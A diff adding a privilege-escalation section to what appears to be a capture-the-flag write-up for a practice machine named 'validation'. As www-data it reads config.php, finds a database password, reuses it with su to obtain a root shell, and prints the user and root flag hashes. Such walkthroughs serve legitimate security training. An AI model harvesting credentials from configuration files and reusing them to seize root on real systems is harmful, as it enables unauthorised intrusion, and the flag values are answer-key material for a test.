@@ -156,3 +156,23 @@ capture cookie session response with burp
  www-data@validation:/home/htb$ cat user.txt
  9d60c098ca9838060aac44bf70499f84
  
+ 
+ [+]PRIVILAGE ESCALATION[+]
+ www-data@validation:/var/www/html$ cat config.php
+<?php
+  $servername = "127.0.0.1";
+  $username = "uhc";
+  $password = "uhc-9qual-global-pw";
+  $dbname = "registration";
+
+  $conn = new mysqli($servername, $username, $password, $dbname);
+?>
+
+www-data@validation:/var/www/html$ su
+Password: uhc-9qual-global-pw
+ 
+id
+uid=0(root) gid=0(root) groups=0(root)
+ 
+cat root.txt
+16e92069a233fb4e127ec741d6b1cc64
